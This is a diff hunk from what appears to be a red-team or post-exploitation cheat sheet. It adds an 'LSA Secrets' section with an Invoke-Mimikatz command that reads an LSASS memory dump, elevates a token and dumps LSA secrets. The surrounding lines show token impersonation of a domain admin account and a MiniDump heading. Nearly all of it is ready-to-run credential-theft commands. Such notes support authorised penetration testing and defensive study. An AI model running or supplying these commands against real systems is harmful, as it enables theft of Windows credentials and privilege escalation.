@@ -52,6 +52,11 @@ list_tokens -u
 impersonate_token corp1\\admin
 getuid
 ```
+## LSA Secrets
+```powershell
+Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\users\public\lsass_592.dmp`" `"token::elevate`" `"lsadump::secrets`" "
+```
+
 ## MiniDump
 ```powershell
 #MiniDump.exe
